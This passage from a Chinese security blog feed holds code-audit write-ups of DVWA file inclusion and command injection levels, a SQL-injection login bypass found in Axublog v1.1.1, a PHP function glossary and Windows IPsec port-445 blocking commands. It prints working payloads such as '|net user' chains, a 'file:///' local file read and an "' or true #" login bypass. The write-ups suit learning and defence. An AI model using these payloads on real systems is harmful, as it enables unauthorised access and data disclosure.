&apos;-&apos;;</span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;</span><br><span class="line">    $temp_file     = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) );</span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">    // Is it an image?</span><br><span class="line">    if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">        ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br><span class="line">        if( $uploaded_type == &apos;image/jpeg&apos; ) &#123;</span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">            imagejpeg( $img, $temp_file, 100);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">            imagepng( $img, $temp_file, 9);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">        // Can we move the file to the web root from the temp folder?</span><br><span class="line">        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">            // Yes!</span><br><span class="line">            $html .= &quot;&lt;pre&gt;&lt;a href=&apos;$&#123;target_path&#125;$&#123;target_file&#125;&apos;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // No</span><br><span class="line">            $html .= &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Delete any temp files</span><br><span class="line">        if( file_exists( $temp_file ) )</span><br><span class="line">            unlink( $temp_file );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Invalid file</span><br><span class="line">        $html .= &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-DVWA-文件包含</title>
      <link href="/article/codeaudit-dvwa-file-inclusion.html"/>
      <url>/article/codeaudit-dvwa-file-inclusion.html</url>
      
        <content type="html"><![CDATA[<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-06.png" alt></p><p>第4行是获取用户输入的参数，没用经过任何过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br></pre></td></tr></table></figure><p>效果如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-07.gif" alt></p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-08.png" alt></p><p>第7-8行是对输入的字符进行了过滤，过滤字符为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br></pre></td></tr></table></figure><p>这些字符被过滤之后就没法使用其他字符了，只能让他过滤成我们需要的字符，过滤字符之后刚好组成我们需要的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httphttp://://</span><br></pre></td></tr></table></figure><p>效果如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-09.gif" alt></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-10.png" alt></p><p>第7行是对传入的文件做了判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">    // This isn&apos;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串，这里判断传入的文件名是否包含file,或者文件名是否等于include.php，那么这里可以利用的就只有前者，文件名包含file。</p><p>使用file可以读取本地计算机的文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///c://windows/win.ini</span><br></pre></td></tr></table></figure><p>效果如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-11.gif" alt></p><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;</span><br><span class="line">    // This isn&apos;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里直接判断是不是需要包含的文件，如果不是直接报错。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-DVWA-命令注入</title>
      <link href="/article/codeaudit-dvwa-command-injection.html"/>
      <url>/article/codeaudit-dvwa-command-injection.html</url>
      
        <content type="html"><![CDATA[<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-01.png" alt></p><p>第10行是调用系统执行系统命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = shell_exec( &apos;ping  &apos; . $target );</span><br></pre></td></tr></table></figure><p>当IP传入后代码就变成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = shell_exec( &apos;ping  127.0.0.1&apos;);</span><br></pre></td></tr></table></figure><p>在Windows和linux环境下,可以使用连接符来同时执行多条命令：</p><table><thead><tr><th align="left">连接符</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">先执行前面的命令再执行后边的命令，当前面的命令出错时，后边的命令不会执行</td></tr><tr><td align="left">管道</td><td align="left">只执行后边的命令，前边的命令不执行</td></tr><tr><td align="left">双管道</td><td align="left">执行前边的命令，如果出错执行后边的命令，不出错不执行</td></tr><tr><td align="left">&amp;</td><td align="left">先执行前面的命令再执行后边的命令，当前面的命令出错时，直接执行后便的命令</td></tr></tbody></table><p>那么这里的代码就可以写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cmd = shell_exec( &apos;ping 127.0.0.1 &amp;&amp; net user&apos;);</span><br><span class="line">$cmd = shell_exec( &apos;ping 127.0.0.1 &amp; net user&apos;);</span><br><span class="line">$cmd = shell_exec( &apos;ping 127.0.0.1 | net user&apos;);</span><br><span class="line">$cmd = shell_exec( &apos;ping ; || net user&apos;);</span><br></pre></td></tr></table></figure><p>为了执行效率，还可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cmd = shell_exec( &apos;ping ; &amp; net user&apos;);</span><br><span class="line">$cmd = shell_exec( &apos;ping ; | net user&apos;);</span><br></pre></td></tr></table></figure><p>效果如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-02.gif" alt></p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-03.png" alt></p><p>第8-11行是对输入的字符进行了过滤，过滤字符为：”&amp;&amp;”,”;”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$substitutions = array(</span><br><span class="line">    &apos;&amp;&amp;&apos; =&gt; &apos;&apos;,</span><br><span class="line">    &apos;;&apos;  =&gt; &apos;&apos;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>那么我们还可以用的字符还有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br><span class="line">|</span><br></pre></td></tr></table></figure><p>现在只需要让ping命令出错，执行后边的命令即可。</p><p>比如换成其他符号（中英文）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">! &amp; net user</span><br><span class="line">= | net user</span><br></pre></td></tr></table></figure><p>绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;;&amp; net user</span><br><span class="line">127.0.0.1 &amp;&amp;&amp; net user</span><br></pre></td></tr></table></figure><p>效果如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-04.gif" alt></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-05.png" alt></p><p>第8-18行是对输入的字符进行了过滤，过滤字符为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$substitutions = array(</span><br><span class="line">    &apos;&amp;&apos;  =&gt; &apos;&apos;,</span><br><span class="line">    &apos;;&apos;  =&gt; &apos;&apos;,</span><br><span class="line">    &apos;| &apos; =&gt; &apos;&apos;,</span><br><span class="line">    &apos;-&apos;  =&gt; &apos;&apos;,</span><br><span class="line">    &apos;$&apos;  =&gt; &apos;&apos;,</span><br><span class="line">    &apos;(&apos;  =&gt; &apos;&apos;,</span><br><span class="line">    &apos;)&apos;  =&gt; &apos;&apos;,</span><br><span class="line">    &apos;`&apos;  =&gt; &apos;&apos;,</span><br><span class="line">    &apos;||&apos; =&gt; &apos;&apos;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>在图片中的第11行，这里的|后边是有空格的，可以用无空格方式绕过:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 |net user</span><br></pre></td></tr></table></figure><p>没用空格的情况下，貌似也无法绕过，反正我是绕不过的，无解，技术水平不够。</p><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &apos;ip&apos; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&apos;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &apos;ping  &apos; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        $html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        $html .= &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>先将内容按照[.]分割字符为4部分，每部分进行判断不为数字则报错，最后将4部分通过[.]连接成ip地址，避免了ip参数处注入其它命令。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-Axublog建站系统</title>
      <link href="/article/codeaudit-axublog.html"/>
      <url>/article/codeaudit-axublog.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h3><p>昨天刚学的代码审计，代码读起来非常的吃力，视频也很”水”，没有讲到精髓，看视频到后边直接想放弃了，蛋疼、蛋疼、蛋疼，但还是下了一个简单的博客源码来看看，上源码之家看了看，压缩包都很大，最后选了一个1M大小的压缩包。</p><h3 id="0x01-SQL注入漏洞"><a href="#0x01-SQL注入漏洞" class="headerlink" title="0x01 SQL注入漏洞"></a>0x01 SQL注入漏洞</h3><p>初次发现了一个SQL注入漏洞，确实挺激动的。</p><ul><li>源码版本：Axublog v1.1.1</li><li>漏洞位置：login.php</li><li>下载地址：<a href="http://pic.axublog.com/axublog1.1.1install.rar" target="_blank" rel="noopener">http://pic.axublog.com/axublog1.1.1install.rar</a></li><li>修复状态：未修复</li></ul><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>默认安装之后后台地址是：<a href="http://localhost/ad/login.php" target="_blank" rel="noopener">http://localhost/ad/login.php</a><br>但是查看ad/login.php文件又找不到任何执行SQL语句的地方，只看到了几个变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@$user=$_POST[&quot;user&quot;];</span><br><span class="line">@$psw=$_POST[&quot;psw&quot;];</span><br><span class="line">@$loginlong=$_POST[&quot;loginlong&quot;];</span><br></pre></td></tr></table></figure><p>搜索@$user发现几个文件包含这个变量，凭感觉，c_login.php才是控制登录的文件。</p><p><img src="../do/images/codeaudit/codeaudit-axublog01.png" alt></p><p>打开这个文件之后发现果然是包含了login.php，那么这里就有个小技巧可以发现哪个是登陆文件了，直接通过搜索login.php文件，看看哪些文件包含了login.php，就能大概猜到是哪个文件了。</p><p>通过用户名变量往上查找，发现了这个程序有SQL注入过滤，过滤函数是sqlguolv()：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function jsloginpost()&#123;</span><br><span class="line">global $tabhead;</span><br><span class="line">global $txtchk;</span><br><span class="line">@$user=$_POST[&quot;user&quot;];</span><br><span class="line">@$psw=$_POST[&quot;psw&quot;];$psw = authcode(@$psw, &apos;ENCODE&apos;, &apos;key&apos;,0); </span><br><span class="line">@$loginlong=$_POST[&quot;loginlong&quot;];</span><br><span class="line">$chk=sqlguolv();</span><br><span class="line">if($chk==1)&#123;</span><br><span class="line">$json_arr = array(&quot;jieguo&quot;=&gt;&quot;&lt;div id=redmsg&gt;登录失败：发现非法字符！&lt;/div&gt;&quot;);</span><br><span class="line">$json_obj = json_encode($json_arr);</span><br><span class="line">echo $json_obj;die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤函数内容如下，刚开始觉得奇怪，这个函数为什么不用传参就能执行和判断，原来是’SERVER’这个变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Function sqlguolv() &#123;</span><br><span class="line">@header(&quot;Content-type:text/html; charset=utf-8&quot;);</span><br><span class="line">$a=&apos;/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\&quot;|\&apos;|\\*|\*|union|into/i&apos;;</span><br><span class="line">if(preg_match($a,$_SERVER[&apos;QUERY_STRING&apos;])==11 or preg_match($a,file_get_contents(&quot;php://input&quot;))==11 )&#123;return &quot;1&quot;;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然过滤了这么多内容，就想看看过滤之后都有什么提示：<br><img src="../do/images/codeaudit/codeaudit-axublog02.png" alt></p><p>嗯！！！竟然没有提示非法字符！往上看了遍代码，竟然没有包含过滤函数的文件，那还过滤个屁啊，把过滤函数的文件包含上去试试。<br>说好的过滤呢？<br><img src="../do/images/codeaudit/codeaudit-axublog03.png" alt></p><p>嗯！！！还是一样，不应该是提示非法字符吗？</p><p>SQLmap跑了一下，竟然没跑出来，那到底是过滤还是没过滤了啊，看看查询语句吧，目测是过滤失效了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from axublog_adusers where adnaa=&apos;select|insertunion|into&apos; and adpss=&apos;yYxvHseLMURYWjNE6YGqRjrqVDZUd38v7C+k/uhYgmw&apos;</span><br></pre></td></tr></table></figure><p>那就根据查询语句试试绕过登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from axublog_adusers where adnaa=&apos;&apos; or true #&apos; and adpss=&apos;yYxvHseLMURYWjNE6YGqRjrqVDZUd38v7C+k/uhYgmw&apos;</span><br></pre></td></tr></table></figure><p><img src="../do/images/codeaudit/codeaudit-axublog04.gif" alt></p><h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><p>来看看为什么过滤会失效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Function sqlguolv() &#123;</span><br><span class="line">@header(&quot;Content-type:text/html; charset=utf-8&quot;);</span><br><span class="line">$a=&apos;/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\&quot;|\&apos;|\\*|\*|union|into/i&apos;;</span><br><span class="line">if(preg_match($a,$_SERVER[&apos;QUERY_STRING&apos;])==11 or preg_match($a,file_get_contents(&quot;php://input&quot;))==11 )&#123;return &quot;1&quot;;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</li><li>这里的过滤做了判断，匹配过滤的字符，条件等于11，这里就有问题。</li><li>SERVER[‘QUERY_STRING’] 这个语句是获取GET请求?后边的内容，所以这里获取的值为空，也就匹配不出来了。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计</title>
      <link href="/article/codeaudit.html"/>
      <url>/article/codeaudit.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>本身对PHP代码不熟悉（压根就看了两个小时的视频），也不可能从头去学习PHP，完全没有这个必要（没时间），代码都一样（怎么可能），会一门编程语言，其他语言就都会了（拉倒吧），所以在这里记录审计遇到不懂的函数、变量等，这应该可以弥补不足。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><table><thead><tr><th align="left">危险函数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">shell_exec()、exec()、passthru()、system()</td><td align="left">通过shell环境执行命令</td></tr></tbody></table><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><table><thead><tr><th align="left">类型</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">$_SERVER[“QUERY_STRING”]</td><td align="left">获取?后面的值</td></tr><tr><td align="left">$_SERVER[“REQUEST_URI”]</td><td align="left">获取 <a href="http://localhost后面的值，包括/" target="_blank" rel="noopener">http://localhost后面的值，包括/</a></td></tr><tr><td align="left">$_SERVER[“SCRIPT_NAME”]</td><td align="left">获取当前脚本的路径，如：index.php</td></tr><tr><td align="left">$_SERVER[“PHP_SELF”]</td><td align="left">当前正在执行脚本的文件名</td></tr><tr><td align="left">preg_match()</td><td align="left">函数用于进行正则表达式匹配，成功返回1，否则返回 0</td></tr><tr><td align="left">isset()</td><td align="left">若变量不存在则返回FALSE，若变量存在且其值为NULL，也返回FALSE</td></tr><tr><td align="left">fnmatch()</td><td align="left">函数根据指定的模式来匹配文件名或字符串</td></tr><tr><td align="left">basename()</td><td align="left">函数返回路径中的文件名部分</td></tr><tr><td align="left">move_uploaded_file()</td><td align="left">函数将上传的文件移动到新位置</td></tr><tr><td align="left">substr()</td><td align="left">函数返回字符串的一部分，语法substr(string,start,length)</td></tr><tr><td align="left">stripos()</td><td align="left">查找字符串在另一字符串中第一次出现的位置（不区分大小写）</td></tr><tr><td align="left">strpos()</td><td align="left">查找字符串在另一字符串中第一次出现的位置（区分大小写）</td></tr><tr><td align="left">strripos()</td><td align="left">查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows 利用IPSec对指定的源地址进行访问限制</title>
      <link href="/article/windows-ipsec.html"/>
      <url>/article/windows-ipsec.html</url>
      
        <content type="html"><![CDATA[<h5 id="创建一个IP安全策略test，描述为禁止445"><a href="#创建一个IP安全策略test，描述为禁止445" class="headerlink" title="创建一个IP安全策略test，描述为禁止445"></a>创建一个IP安全策略test，描述为禁止445</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh ipsec static add policy name=test description=&quot;禁止445&quot;</span><br></pre></td></tr></table></figure><h5 id="创建一个筛选器列表，名称为BanIP"><a href="#创建一个筛选器列表，名称为BanIP" class="headerlink" title="创建一个筛选器列表，名称为BanIP"></a>创建一个筛选器列表，名称为BanIP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh ipsec static add filterlist name=BanIP</span><br></pre></td></tr></table></figure><h5 id="为BanIP这个筛选器列表中添加一个筛选器，这个筛选器禁止网络流量如下"><a href="#为BanIP这个筛选器列表中添加一个筛选器，这个筛选器禁止网络流量如下" class="headerlink" title="为BanIP这个筛选器列表中添加一个筛选器，这个筛选器禁止网络流量如下"></a>为BanIP这个筛选器列表中添加一个筛选器，这个筛选器禁止网络流量如下</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh ipsec static add filter filterlist=BanIP srcaddr=10.10.10.10 dstaddr=Me dstport=445 protocol=TCP</span><br><span class="line">netsh ipsec static add filter filterlist=BanIP srcaddr=192.168.0.0 srcmask=255.255.0.0 dstaddr=Me dstport=445 protocol=TCP</span><br><span class="line">netsh ipsec static add filter filterlist=BanIP srcaddr=192.168.0.0 srcmask=255.255.0.0 dstaddr=Me dstport=445 protocol=UDP</span><br></pre></td></tr></table></figure><h5 id="创建一个筛选器动作，名为BanIP，action为block"><a href="#创建一个筛选器动作，名为BanIP，action为block" class="headerlink" title="创建一个筛选器动作，名为BanIP，action为block"></a>创建一个筛选器动作，名为BanIP，action为block</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh ipsec static add filteraction name=BanIP action=block</span><br></pre></td></tr></table></figure><h5 id="添加一个规则，名称为“BanIP”，所属策略为“test”，用于将BanIP这个筛选器列表进行BanIP操作"><a href="#添加一个规则，名称为“BanIP”，所属策略为“test”，用于将BanIP这个筛选器列表进行BanIP操作" class="headerlink" title="添加一个规则，名称为“BanIP”，所属策略为“test”，用于将BanIP这个筛选器列表进行BanIP操作"></a>添加一个规则，名称为“BanIP”，所属策略为“test”，用于将BanIP这个筛选器列表进行BanIP操作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh ipsec static add rule name=BanIP policy=test filterlist=BanIP filteraction=BanIP</span><br></pre></td></tr></table></figure><h5 id="指派名称为test的安全策略为当前生效的策略"><a href="#指派名称为test的安全策略为当前生效的策略" class="headerlink" title="指派名称为test的安全策略为当前生效的策略"></a>指派名称为test的安全策略为当前生效的策略</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh ipsec static set policy name=test assign=y</span><br></pre></td></tr></table></figure><h5 id="删除IP安全策略中的所有的内容，包括所有的策略、规则、筛选器列表、筛选器、筛选器动作等。"><a href="#删除IP安全策略中的所有的内容，包括所有的策略、规则、筛选器列表、筛选器、筛选器动作等。" class="headerlink" title="删除IP安全策略中的所有的内容，包括所有的策略、规则、筛选器列表、筛选器、筛选器动作等。"></a>删除IP安全策略中的所有的内容，包括所有的策略、规则、筛选器列表、筛选器、筛选器动作等。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh ipsec static del all</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-MetaSploit Framework</title>
      <link href="/article/pentest-metasploit-framework.html"/>
